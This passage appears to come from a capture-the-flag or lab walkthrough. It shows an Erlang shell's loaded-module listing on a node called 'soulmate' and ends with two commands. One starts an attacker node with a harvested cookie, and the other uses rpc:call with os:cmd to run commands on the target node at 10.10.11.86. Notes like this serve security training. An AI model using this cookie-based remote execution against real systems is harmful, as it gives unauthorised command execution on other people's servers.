global_group          /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/global_group.beam
group                 /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/group.beam
group_history         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/group_history.beam
heart                 /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/heart.beam
inet                  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet.beam
inet_config           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_config.beam
inet_db               /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_db.beam
inet_gethost_native   /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_gethost_native.beam
inet_parse            /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_parse.beam
inet_tcp              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_tcp.beam
inet_tcp_dist         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_tcp_dist.beam
inet_udp              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_udp.beam
init                  preloaded
io                    /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/io.beam
io_lib                /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/io_lib.beam
io_lib_format         /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/io_lib_format.beam
io_lib_pretty         /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/io_lib_pretty.beam
kernel                /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/kernel.beam
kernel_config         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/kernel_config.beam
kernel_refc           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/kernel_refc.beam
lists                 /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/lists.beam
logger                /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger.beam
logger_backend        /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_backend.beam
logger_config         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_config.beam
logger_filters        /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_filters.beam
logger_formatter      /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_formatter.beam
logger_h_common       /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_h_common.beam
logger_handler_watch  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_handler_watcher.beam
logger_olp            /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_olp.beam
logger_proxy          /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_proxy.beam
logger_server         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_server.beam
logger_simple_h       /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_simple_h.beam
logger_std_h          /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_std_h.beam
logger_sup            /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_sup.beam
maps                  /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/maps.beam
net_kernel            /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/net_kernel.beam
orddict               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/orddict.beam
ordsets               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/ordsets.beam
os                    /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/os.beam
otp_internal          /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/otp_internal.beam
peer                  /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/peer.beam
persistent_term       preloaded
prim_buffer           preloaded
prim_eval             preloaded
prim_file             preloaded
prim_inet             preloaded
prim_net              preloaded
prim_socket           preloaded
prim_tty              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/prim_tty.beam
prim_zip              preloaded
proc_lib              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/proc_lib.beam
proplists             /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/proplists.beam
pubkey_cert_records   /usr/local/lib/erlang/lib/public_key-1.17.1/ebin/pubkey_cert_records.beam
public_key            /usr/local/lib/erlang/lib/public_key-1.17.1/ebin/public_key.beam
queue                 /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/queue.beam
rand                  /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/rand.beam
raw_file_io           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/raw_file_io.beam
raw_file_io_list      /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/raw_file_io_list.beam
re                    /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/re.beam
rpc                   /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/rpc.beam
sets                  /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/sets.beam
shell                 /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/shell.beam
shell_default         /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/shell_default.beam
socket_registry       preloaded
sofs                  /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/sofs.beam
ssh                   /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh.beam
ssh_acceptor          /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_acceptor.beam
ssh_acceptor_sup      /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_acceptor_sup.beam
ssh_app               /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_app.beam
ssh_auth              /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_auth.beam
ssh_bits              /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_bits.beam
ssh_channel_sup       /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_channel_sup.beam
ssh_cli               /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_cli.beam
ssh_client_channel    /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_client_channel.beam
ssh_connection        /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_connection.beam
ssh_connection_handl  /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_connection_handler.beam
ssh_connection_sup    /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_connection_sup.beam
ssh_dbg               /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_dbg.beam
ssh_file              /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_file.beam
ssh_fsm_kexinit       /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_fsm_kexinit.beam
ssh_fsm_userauth_ser  /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_fsm_userauth_server.beam
ssh_lib               /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_lib.beam
ssh_message           /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_message.beam
ssh_options           /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_options.beam
ssh_server_channel    /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_server_channel.beam
ssh_sftpd             /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_sftpd.beam
ssh_system_sup        /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_system_sup.beam
ssh_tcpip_forward_ac  /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_tcpip_forward_acceptor_sup.beam
ssh_transport         /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_transport.beam
standard_error        /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/standard_error.beam
start_escript__escri  /usr/local/lib/erlang_login/start.escript
string                /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/string.beam
supervisor            /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/supervisor.beam
supervisor_bridge     /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/supervisor_bridge.beam
sys_core_alias        /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/sys_core_alias.beam
sys_core_bsm          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/sys_core_bsm.beam
sys_core_fold         /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/sys_core_fold.beam
unicode               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/unicode.beam
unicode_util          /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/unicode_util.beam
user_drv              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/user_drv.beam
user_sup              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/user_sup.beam
v3_core               /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/v3_core.beam
zlib                  preloaded
ok
(ssh_runner@soulmate)3>
```
---
erl -name attacker@yourip -setcookie COOKIE using this command to exexute the commands
rpc:call('ben@10.10.11.86', os, cmd, ["id"])

